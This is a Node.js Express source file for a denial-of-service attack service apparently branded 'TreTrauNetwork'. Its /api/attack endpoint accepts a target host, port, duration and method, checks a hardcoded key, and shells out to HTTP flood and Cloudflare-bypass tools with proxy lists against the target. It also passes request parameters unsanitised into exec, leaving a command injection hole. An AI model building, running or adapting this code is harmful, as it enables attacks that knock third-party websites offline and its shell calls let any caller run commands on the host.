const dns = require('dns');
const util = require('util');
const lookupPromise = util.promisify(dns.lookup);
const startTime = process.hrtime();
const elapsedTime = process.hrtime(startTime);
const durationInMs = elapsedTime[0] * 1000 + elapsedTime[1] / 1000000;
let running = "0"
let dateObject = new Date();
let date = ("0" + dateObject.getDate()).slice(-2);
let month = ("0" + (dateObject.getMonth() + 1)).slice(-2);
let year = dateObject.getFullYear();
let hours = dateObject.getHours();
let minutes = dateObject.getMinutes();
let seconds = dateObject.getSeconds();
const cc3m = year + "-" + month + "-" + date + " " + hours + ":" + minutes + ":" + seconds
async function getIPAndISP(host) {
  try {
      const { address } = await lookupPromise(host);
      const apiUrl = `http://ip-api.com/json/${address}`;
      const response = await fetch(apiUrl);
      if (response.ok) {
          const data = await response.json();
          isp = data.isp;
          country = data.country;
          org = data.org;
      } else {
          return isp, org, country
      }
  } catch (error) {
      return;
  }
}
const http = require("http");
const axios = require("axios");
const fs = require("fs");
const url = require("url");
let isp;
let org;
let country;
const express = require("express");
const app = express();
const port = 9999;
const blockedPrefixes = [];
const blacklist = fs.readFileSync("blacklist.txt", "utf-8").split("\n").map((line) => line.trim()).filter((line) => line !== "");
var exec = require("child_process").exec;

app.get("/api/attack", (req, res) => {
  const clientIP =
    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const { key, host, time, method, port } = req.query;
  console.log(`IP Connect: ${clientIP} ${host} ${method}`);
  const parsedTarget = url.parse(host)
  if (!key || !host || !time || !method || !port) {
    const err_u = {
      status: `error`,
      message: `Server url API : /api/attack?key=EnterYouKey&host={host}&port={port}&method={method}&time={time}`,
    };
    return res.status(400).send(err_u);
  }

  if (key !== "dung") {
    const err_key = {
      status: `error`,
      message: `Error Keys`,
    };
    return res.status(400).send(err_key);
  }

  const isBlocked = blockedPrefixes.some(prefix => host.includes(prefix));
  if (isBlocked) {
    return res.send({ error: true, message: "This target is blacklisted." });
  }

  if (time > 10000000000001) {
    const err_time = {
      status: `error`,
      message: `Error Time < 10000000000000 Second`,
    };
    return res.status(400).send(err_time);
  }
  if (port > 65535 || port < 1) {
    const err_time = {
      status: `error`,
      message: `Error Port`,
    };
    return res.status(400).send(err_time);
  }

  if (
    !(
      method.toLowerCase() === "http" ||
      method.toLowerCase() === "cloudflare" ||
      method.toLowerCase() === "bypass"

    )
  ) {
    const err_method = {
      status: `error`,
      method_valid: `Error Methods`,
      online: `http cloudflare bypass`,
    };
    return res.status(400).send(err_method);
  }

  const jsonData = {
    status: `Sent Attack Request To TreTrauNetwork Dashboard`,
    message: `Sent Attack Successfully`,
    host: `${host}`,
    port: `${port}`,
    time: `${time}`,
    method: `${method}`,
    isp: `${isp}`,
    org: `${org}`,
    country: `${country}`,
    date: `${cc3m}`,
    response: `${durationInMs} ms`,
    note: `All Methods Here Has Been Upgraded, Have Best Experience With Real Power!`,
  };
  res.status(200).send(jsonData);
  if (method.toLowerCase() === "http") {

    exec(
      `node penguin1.6 -s ${time} -t 7 -r 90 -v 2 --full true --extra true --delay 0 -q true -d true --randpath true -F true -C RAND -R RAND --randrate 200-1280 -m GET -p vietjack.txt --cache -u ${host}`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [http] executed successfully`);
      },
    );
  }
  if (method.toLowerCase() === "bypass") {

    exec(
      `node tretraubypassv3 ${host} ${time} 64 5 vietjack.txt --cache --full --extra --redirect --yarm --query --stealth --behavioral --ddos --redirect --fingerprint --randpath`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [bypass] executed successfully`);
      },
    );
  }

  if (method.toLowerCase() === "cloudflare") {

    exec(
      `node tretraucloudflare.js ${host} ${time} 90 5 vietjack.txt`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [cf] executed successfully`);
      },
    );
  }
  if (method.toLowerCase() === "uam") {

    exec(
      `node uam.js ${host} ${time} 90 5 vietjack.txt`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [uam] executed successfully`);
      },
    );
  }

});
app.listen(port, () => {
  console.log(`[API SERVER] running on http://localhost:${port}`);
});
